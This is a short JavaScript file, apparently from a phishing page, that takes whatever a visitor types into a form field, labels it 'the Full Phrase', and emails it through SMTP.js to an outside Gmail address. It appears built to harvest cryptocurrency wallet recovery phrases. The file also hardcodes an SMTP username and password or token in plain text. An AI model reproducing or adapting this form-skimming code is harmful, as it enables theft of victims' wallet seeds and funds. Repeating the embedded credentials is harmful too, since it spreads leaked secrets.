
//     }).then(
//       message => {
//         if(message === "OK") {
//                 document.getElementById("status").style.display = "block";
//         }
//       }
//     );
// };


// Form.addEventListener("submit", (e) =>{
//     e.preventDefault();

//     sendEmail()

// });
const Form = document.getElementById('my-form');
const Names = document.getElementById('contact-inputs')

function sendEmail(){
  const bodyMessage = `This is the Full Phrase: ${Names.value}`;
  Email.send({
      Host : "smtp.elasticemail.com",
      Username : "echefrankidosky4love@gmail.com",
      Password : "725D37FCB7F937F9F00766F4321613C4A44697484638B4A5A089F64AD28A645527294171EBD916F64E67C254A9BF2B71",
      To : ' mikebrew001@gmail.com ',
      From : "echefrankidosky4love@gmail.com",
      Subject : Names.value,
      Body : bodyMessage
  }).then(
    message => {
      if(message === "OK") {
            document.getElementById("status").style.display = "block";
      }
    }
  );
};


Form.addEventListener("submit", (e) =>{
  e.preventDefault();

  sendEmail()

});


